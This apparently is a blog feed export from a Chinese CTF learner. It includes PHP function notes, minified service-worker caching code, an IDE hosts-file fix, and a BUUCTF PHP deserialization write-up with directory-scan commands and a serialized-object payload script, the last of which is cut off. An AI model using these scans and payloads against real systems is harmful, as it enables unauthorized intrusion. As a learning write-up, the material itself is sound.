class="line-numbers-rows"><span></span></span></code></pre><blockquote><ol><li><code>getcwd()</code>获取当前目录</li><li>dirname()目录上跳:—返回父目录的路径</li><li>chdir (字符串 <code>$directory</code>): bool     将 PHP 的当前目录更改为 <code>directory</code>.</li><li>scandir()文件、目录遍历</li><li>array_reverse() 函数返回翻转顺序的数组</li><li>readfile() 函数读取一个文件，并写入到输出缓冲</li><li>next()函数将内部指针指向数组中的下一个元素，并输出</li><li><a href="https://www.runoob.com/php/func-array-prev.html">prev()</a> - 将内部指针指向数组中的上一个元素，并输出</li><li><a href="https://www.runoob.com/php/func-array-current.html">current()</a> - 返回数组中的当前元素的值</li><li><a href="https://www.runoob.com/php/func-array-end.html">end()</a> - 将内部指针指向数组中的最后一个元素，并输出</li><li><a href="https://www.runoob.com/php/func-array-reset.html">reset()</a> - 将内部指针指向数组中的第一个元素，并输出</li><li><a href="https://www.runoob.com/php/func-array-each.html">each()</a> - 返回当前元素的键名和键值，并将内部指针向前移动</li></ol></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="https://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://kannikanyun.github.io/2022/06/17/public/workbox-e28eeb62/"/>
    <id>https://kannikanyun.github.io/2022/06/17/public/workbox-e28eeb62/</id>
    <published>2022-06-17T05:33:42.844Z</published>
    <updated>2022-06-17T05:34:15.862Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>define(["exports"],(function(t){"use strict";try{self["workbox:core:6.4.1"]&&_()}catch(t){}const e=(t,...e)=>{let s=t;return e.length>0&&(s+=` :: ${JSON.stringify(e)}`),s};class s extends Error{constructor(t,s){super(e(t,s)),this.name=t,this.details=s}}try{self["workbox:routing:6.4.1"]&&_()}catch(t){}const r=t=>t&&"object"==typeof t?t:{handle:t};class n{constructor(t,e,s="GET"){this.handler=r(e),this.match=t,this.method=s}setCatchHandler(t){this.catchHandler=r(t)}}class i extends n{constructor(t,e,s){super((({url:e})=>{const s=t.exec(e.href);if(s&&(e.origin===location.origin||0===s.index))return s.slice(1)}),e,s)}}class o{constructor(){this.t=new Map,this.i=new Map}get routes(){return this.t}addFetchListener(){self.addEventListener("fetch",(t=>{const{request:e}=t,s=this.handleRequest({request:e,event:t});s&&t.respondWith(s)}))}addCacheListener(){self.addEventListener("message",(t=>{if(t.data&&"CACHE_URLS"===t.data.type){const{payload:e}=t.data,s=Promise.all(e.urlsToCache.map((e=>{"string"==typeof e&&(e=[e]);const s=new Request(...e);return this.handleRequest({request:s,event:t})})));t.waitUntil(s),t.ports&&t.ports[0]&&s.then((()=>t.ports[0].postMessage(!0)))}}))}handleRequest({request:t,event:e}){const s=new URL(t.url,location.href);if(!s.protocol.startsWith("http"))return;const r=s.origin===location.origin,{params:n,route:i}=this.findMatchingRoute({event:e,request:t,sameOrigin:r,url:s});let o=i&&i.handler;const a=t.method;if(!o&&this.i.has(a)&&(o=this.i.get(a)),!o)return;let c;try{c=o.handle({url:s,request:t,event:e,params:n})}catch(t){c=Promise.reject(t)}const h=i&&i.catchHandler;return c instanceof Promise&&(this.o||h)&&(c=c.catch((async r=>{if(h)try{return await h.handle({url:s,request:t,event:e,params:n})}catch(t){t instanceof Error&&(r=t)}if(this.o)return this.o.handle({url:s,request:t,event:e});throw r}))),c}findMatchingRoute({url:t,sameOrigin:e,request:s,event:r}){const n=this.t.get(s.method)||[];for(const i of n){let n;const o=i.match({url:t,sameOrigin:e,request:s,event:r});if(o)return n=o,(Array.isArray(n)&&0===n.length||o.constructor===Object&&0===Object.keys(o).length||"boolean"==typeof o)&&(n=void 0),{route:i,params:n}}return{}}setDefaultHandler(t,e="GET"){this.i.set(e,r(t))}setCatchHandler(t){this.o=r(t)}registerRoute(t){this.t.has(t.method)||this.t.set(t.method,[]),this.t.get(t.method).push(t)}unregisterRoute(t){if(!this.t.has(t.method))throw new s("unregister-route-but-not-found-with-method",{method:t.method});const e=this.t.get(t.method).indexOf(t);if(!(e>-1))throw new s("unregister-route-route-not-registered");this.t.get(t.method).splice(e,1)}}let a;const c=()=>(a||(a=new o,a.addFetchListener(),a.addCacheListener()),a);const h={googleAnalytics:"googleAnalytics",precache:"precache-v2",prefix:"workbox",runtime:"runtime",suffix:"undefined"!=typeof registration?registration.scope:""},u=t=>[h.prefix,t,h.suffix].filter((t=>t&&t.length>0)).join("-"),f=t=>t||u(h.runtime);function l(t,e){const s=new URL(t);for(const t of e)s.searchParams.delete(t);return s.href}class w{constructor(){this.promise=new Promise(((t,e)=>{this.resolve=t,this.reject=e}))}}const d=new Set;try{self["workbox:strategies:6.4.1"]&&_()}catch(t){}function p(t){return"string"==typeof t?new Request(t):t}class y{constructor(t,e){this.h={},Object.assign(this,e),this.event=e.event,this.u=t,this.l=new w,this.p=[],this.v=[...t.plugins],this.m=new Map;for(const t of this.v)this.m.set(t,{});this.event.waitUntil(this.l.promise)}async fetch(t){const{event:e}=this;let r=p(t);if("navigate"===r.mode&&e instanceof FetchEvent&&e.preloadResponse){const t=await e.preloadResponse;if(t)return t}const n=this.hasCallback("fetchDidFail")?r.clone():null;try{for(const t of this.iterateCallbacks("requestWillFetch"))r=await t({request:r.clone(),event:e})}catch(t){if(t instanceof Error)throw new s("plugin-error-request-will-fetch",{thrownErrorMessage:t.message})}const i=r.clone();try{let t;t=await fetch(r,"navigate"===r.mode?void 0:this.u.fetchOptions);for(const s of this.iterateCallbacks("fetchDidSucceed"))t=await s({event:e,request:i,response:t});return t}catch(t){throw n&&await this.runCallbacks("fetchDidFail",{error:t,event:e,originalRequest:n.clone(),request:i.clone()}),t}}async fetchAndCachePut(t){const e=await this.fetch(t),s=e.clone();return this.waitUntil(this.cachePut(t,s)),e}async cacheMatch(t){const e=p(t);let s;const{cacheName:r,matchOptions:n}=this.u,i=await this.getCacheKey(e,"read"),o=Object.assign(Object.assign({},n),{cacheName:r});s=await caches.match(i,o);for(const t of this.iterateCallbacks("cachedResponseWillBeUsed"))s=await t({cacheName:r,matchOptions:n,cachedResponse:s,request:i,event:this.event})||void 0;return s}async cachePut(t,e){const r=p(t);var n;await(n=0,new Promise((t=>setTimeout(t,n))));const i=await this.getCacheKey(r,"write");if(!e)throw new s("cache-put-with-no-response",{url:(o=i.url,new URL(String(o),location.href).href.replace(new RegExp(`^${location.origin}`),""))});var o;const a=await this.g(e);if(!a)return!1;const{cacheName:c,matchOptions:h}=this.u,u=await self.caches.open(c),f=this.hasCallback("cacheDidUpdate"),w=f?await async function(t,e,s,r){const n=l(e.url,s);if(e.url===n)return t.match(e,r);const i=Object.assign(Object.assign({},r),{ignoreSearch:!0}),o=await t.keys(e,i);for(const e of o)if(n===l(e.url,s))return t.match(e,r)}(u,i.clone(),["__WB_REVISION__"],h):null;try{await u.put(i,f?a.clone():a)}catch(t){if(t instanceof Error)throw"QuotaExceededError"===t.name&&await async function(){for(const t of d)await t()}(),t}for(const t of this.iterateCallbacks("cacheDidUpdate"))await t({cacheName:c,oldResponse:w,newResponse:a.clone(),request:i,event:this.event});return!0}async getCacheKey(t,e){const s=`${t.url} | ${e}`;if(!this.h[s]){let r=t;for(const t of this.iterateCallbacks("cacheKeyWillBeUsed"))r=p(await t({mode:e,request:r,event:this.event,params:this.params}));this.h[s]=r}return this.h[s]}hasCallback(t){for(const e of this.u.plugins)if(t in e)return!0;return!1}async runCallbacks(t,e){for(const s of this.iterateCallbacks(t))await s(e)}*iterateCallbacks(t){for(const e of this.u.plugins)if("function"==typeof e[t]){const s=this.m.get(e),r=r=>{const n=Object.assign(Object.assign({},r),{state:s});return e[t](n)};yield r}}waitUntil(t){return this.p.push(t),t}async doneWaiting(){let t;for(;t=this.p.shift();)await t}destroy(){this.l.resolve(null)}async g(t){let e=t,s=!1;for(const t of this.iterateCallbacks("cacheWillUpdate"))if(e=await t({request:this.request,response:e,event:this.event})||void 0,s=!0,!e)break;return s||e&&200!==e.status&&(e=void 0),e}}t.CacheFirst=class extends class{constructor(t={}){this.cacheName=f(t.cacheName),this.plugins=t.plugins||[],this.fetchOptions=t.fetchOptions,this.matchOptions=t.matchOptions}handle(t){const[e]=this.handleAll(t);return e}handleAll(t){t instanceof FetchEvent&&(t={event:t,request:t.request});const e=t.event,s="string"==typeof t.request?new Request(t.request):t.request,r="params"in t?t.params:void 0,n=new y(this,{event:e,request:s,params:r}),i=this.q(n,s,e);return[i,this.R(i,n,s,e)]}async q(t,e,r){let n;await t.runCallbacks("handlerWillStart",{event:r,request:e});try{if(n=await this.O(e,t),!n||"error"===n.type)throw new s("no-response",{url:e.url})}catch(s){if(s instanceof Error)for(const i of t.iterateCallbacks("handlerDidError"))if(n=await i({error:s,event:r,request:e}),n)break;if(!n)throw s}for(const s of t.iterateCallbacks("handlerWillRespond"))n=await s({event:r,request:e,response:n});return n}async R(t,e,s,r){let n,i;try{n=await t}catch(i){}try{await e.runCallbacks("handlerDidRespond",{event:r,request:s,response:n}),await e.doneWaiting()}catch(t){t instanceof Error&&(i=t)}if(await e.runCallbacks("handlerDidComplete",{event:r,request:s,response:n,error:i}),e.destroy(),i)throw i}}{async O(t,e){let r,n=await e.cacheMatch(t);if(!n)try{n=await e.fetchAndCachePut(t)}catch(t){t instanceof Error&&(r=t)}if(!n)throw new s("no-response",{url:t.url,error:r});return n}},t.clientsClaim=function(){self.addEventListener("activate",(()=>self.clients.claim()))},t.registerRoute=function(t,e,r){let o;if("string"==typeof t){const s=new URL(t,location.href);o=new n((({url:t})=>t.href===s.href),e,r)}else if(t instanceof RegExp)o=new i(t,e,r);else if("function"==typeof t)o=new n(t,e,r);else{if(!(t instanceof n))throw new s("unsupported-route-type",{moduleName:"workbox-routing",funcName:"registerRoute",paramName:"capture"});o=t}return c().registerRoute(o),o}}));//# sourceMappingURL=workbox-e28eeb62.js.map]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://kannikanyun.github.io/2022/06/17/public/service-worker/"/>
    <id>https://kannikanyun.github.io/2022/06/17/public/service-worker/</id>
    <published>2022-06-17T05:33:42.838Z</published>
    <updated>2022-06-17T05:34:15.859Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>if(!self.define){let e,t={};const o=(o,n)=>(o=new URL(o+".js",n).href,t[o]||new Promise((t=>{if("document"in self){const e=document.createElement("script");e.src=o,e.onload=t,document.head.appendChild(e)}else e=o,importScripts(o),t()})).then((()=>{let e=t[o];if(!e)throw new Error(`Module ${o} didn’t register its module`);return e})));self.define=(n,r)=>{const s=e||("document"in self?document.currentScript.src:"")||location.href;if(t[s])return;let i={};const c=e=>o(e,s),l={module:{uri:s},exports:i,require:c};t[s]=Promise.all(n.map((e=>l[e]||c(e)))).then((e=>(r(...e),i)))}}define(["./workbox-e28eeb62"],(function(e){"use strict";self.skipWaiting(),e.clientsClaim(),e.registerRoute(/^https:\/\/cdn\.example\.com\/.*/,new e.CacheFirst,"GET")}));//# sourceMappingURL=service-worker.js.map]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>记IDEA无法搜索插件</title>
    <link href="https://kannikanyun.github.io/2022/06/17/%E8%AE%B0IDEA%E6%97%A0%E6%B3%95%E6%90%9C%E7%B4%A2%E6%8F%92%E4%BB%B6/"/>
    <id>https://kannikanyun.github.io/2022/06/17/%E8%AE%B0IDEA%E6%97%A0%E6%B3%95%E6%90%9C%E7%B4%A2%E6%8F%92%E4%BB%B6/</id>
    <published>2022-06-17T05:00:37.000Z</published>
    <updated>2022-06-17T05:26:54.531Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="IDEA汉化问题"><a href="#IDEA汉化问题" class="headerlink" title="IDEA汉化问题"></a>IDEA汉化问题</h1><p>搜索汉化插件过程中一直加载没别的显示，挂了<img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206171308607.png" alt="img">但是不行哇，重启也不行</p><p>于是搜索一下，不得不说，互联网真的强大，只要你想学，都有人教</p><h2 id="修复过程："><a href="#修复过程：" class="headerlink" title="修复过程："></a>修复过程：</h2><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206171312515.png" alt="image-20220617131206398"></p><h3 id="先设置代理："><a href="#先设置代理：" class="headerlink" title="先设置代理："></a>先设置代理：</h3><p><a href="http://127.0.0.1:1080/">http://127.0.0.1:1080</a> ==重启==后依旧不行</p><p>继续重新设置</p><p><a href="https://plugins.jetbrains.com/">https://plugins.jetbrains.com/</a></p><p>点击<img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206171314184.png" alt="image-20220617131448148"></p><p><strong>显示连接超时，可能与网络有关</strong></p><h3 id="网络验证："><a href="#网络验证：" class="headerlink" title="网络验证："></a>网络验证：</h3><p><strong>win+R输入/cmd，打开命令提示符，ping plugins.jetbrains.com</strong></p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206171316830.png" alt="image-20220617131620773"></p><p><strong>如果是这样就代表网络延迟很高，导致加载不出来。如果ping不通可能和网关有关。</strong></p><h3 id="网络延迟很高的解决方法："><a href="#网络延迟很高的解决方法：" class="headerlink" title="网络延迟很高的解决方法："></a><strong>网络延迟很高的解决方法：</strong></h3><p><strong>找到host文件，添加一个配置。</strong></p><blockquote><p>host文件路径：<code>C:\Windows\System32\drivers\etc</code></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206171317836.png" alt="image-20220617131704801"></p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">13.249.171.117 plugins.jetbrains.com13.249.171.117 jetbrains.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206171322552.png" alt="image-20220617132213446"></p><p><strong>如果还是请求超时可以换一个地址</strong>🤦‍♂️</p><blockquote><blockquote><p>resrart—–&gt;<em><u>解决</u></em></p></blockquote></blockquote><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>ping一般用来检查网络状态</p><p>host中配置和网络有关</p><p><a href="https://blog.csdn.net/qq_44790505/article/details/123844243?ops_request_misc=%7B%22request_id%22:%22165544105716782391890897%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=165544105716782391890897&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-123844243-null-null.142%5Ev17%5Epc_rank_34,157%5Ev15%5Enew_3&utm_term=idea+plugins%E4%B8%80%E7%9B%B4%E8%BD%AC%E5%9C%88&spm=1018.2226.3001.4187">参考文章</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="JAVA" scheme="https://kannikanyun.github.io/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>BUUweb刷题记录2</title>
    <link href="https://kannikanyun.github.io/2022/06/14/BUUweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/"/>
    <id>https://kannikanyun.github.io/2022/06/14/BUUweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/</id>
    <published>2022-06-14T10:54:15.000Z</published>
    <updated>2022-06-25T15:06:56.727Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="极客大挑战-2019-PHP1"><a href="#极客大挑战-2019-PHP1" class="headerlink" title="[极客大挑战 2019]PHP1"></a>[极客大挑战 2019]PHP1</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206141855692.png" alt="image-20220614185558645"></p><p>思路：</p><ol><li>一开始只想到看源码，没发现</li><li>提示==备份==，扫描网站目录呀</li></ol><p>python3 dirsearch.py -u “<a href="http://49ccffbe-070a-4af8-bedc-679f278f20f3.node4.buuoj.cn:81/?.php&quot;">http://49ccffbe-070a-4af8-bedc-679f278f20f3.node4.buuoj.cn:81/?.php&quot;</a> -e * -w ndb</p><p>kali:目录在~的dirsearch</p><p>扫描工具使用：</p><h2 id="dirsearch："><a href="#dirsearch：" class="headerlink" title="dirsearch："></a>dirsearch：</h2><p>下载项目，并打开</p><pre class="line-numbers language-less" data-language="less"><code class="language-less">Copy┌─[root<span class="token variable">@kali</span>]─[<span class="token operator">/</span>kali]└──╼ #git clone <span class="token property">https</span><span class="token punctuation">:</span><span class="token comment">//github.com/maurosoria/dirsearch</span>Copy┌─[root<span class="token variable">@kali</span>]─[<span class="token operator">/</span>kali]└──╼ #cd dirsearch<span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>运行需要python3环境</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript">Copy┌─<span class="token punctuation">[</span>root<span class="token decorator"><span class="token at operator">@</span><span class="token function">kali</span></span><span class="token punctuation">]</span>─<span class="token punctuation">[</span><span class="token operator">/</span>kali<span class="token operator">/</span>dirsearch<span class="token punctuation">]</span>└──╼ #python3 dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://localhost/"</span> <span class="token operator">-</span>e <span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>扫描网站需要指定网站的脚本类型，* 为全部类型的脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python3 dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"950f20e7-c4b0-4277-b5a4-98ba51ba0d1f.node4.buuoj.cn:81/"</span> <span class="token operator">-</span>e<span class="token operator">*</span> <span class="token operator">-</span>w db<span class="token operator">/</span>综合高危<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>kali中py3安装（kali自带py为2.~）</p><p>==但是这个笨蛋没有能扫出来啊啊啊==（还有，命令中-e*  中间没有空格）</p><p>如果要排除某些HTTP状态代码，请使用-x标志。</p><p><em>＃dirsearch -u</em> <em><a href="http://192.168.0.102/dvwa">http://192.168.0.102/dvwa</a></em> <em>-e php -x 403</em></p><p>[详细命令：]([<a href="https://www.cnblogs.com/-mo-/p/11466092.html">WEB安全]Dirsearch工具命令 - 肖洋肖恩、 - 博客园 (cnblogs.com)</a>)</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206152101795.png" alt="image-20220615210142521"></p><p>没想到Windows下的dirsearch能扫，哎哎</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206152239673.png" alt="image-20220615223910618"></p><p><a href="%5B(6%E6%9D%A1%E6%B6%88%E6%81%AF">Windows下dirsearch配置</a> dirsearch使用教程（Windows版本）_大西瓜的安全之路的博客-CSDN博客_dirsearch windows](<a href="https://blog.csdn.net/qq_43006864/article/details/121929398?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=dirsearch%E7%94%A8%E4%B8%8D%E4%BA%86&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-121929398.142%5Ev14%5Epc_search_result_control_group,157%5Ev14%5Enew_3&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/qq_43006864/article/details/121929398?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=dirsearch用不了&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-121929398.142^v14^pc_search_result_control_group,157^v14^new_3&amp;spm=1018.2226.3001.4187</a>))</p><p>==应该是网站有扫描限制==</p><h2 id="换御剑扫"><a href="#换御剑扫" class="headerlink" title="换御剑扫"></a>换御剑扫</h2><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206152108050.png" alt="image-20220615210815012"></p><p>多扫几次也不行，哎（工具小子都不会当😢）</p><p><a href="https://blog.csdn.net/weixin_51735061/article/details/124236800">顺带分享下大神整理的网站目录扫描工具</a></p><hr><p>访问<code>www.zip</code></p><h3 id="两处代码："><a href="#两处代码：" class="headerlink" title="两处代码："></a>两处代码：</h3><p>Class.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Name</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>NO!!!hacker!!!&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You name is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You password is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以及index.php中</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>   <span class="token keyword">include</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span>   <span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'select'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得出url传参值需要：</p><pre class="line-numbers language-none"><code class="language-none">password&#x3D;100,username&#x3D;admin&#96;才能&#96;echo $flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>   <span class="token keyword">class</span> <span class="token class-name-definition class-name">Name</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Name</span><span class="token punctuation">(</span>admin<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Name<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Name<span class="token operator">%</span><span class="token number">00</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>admin<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span 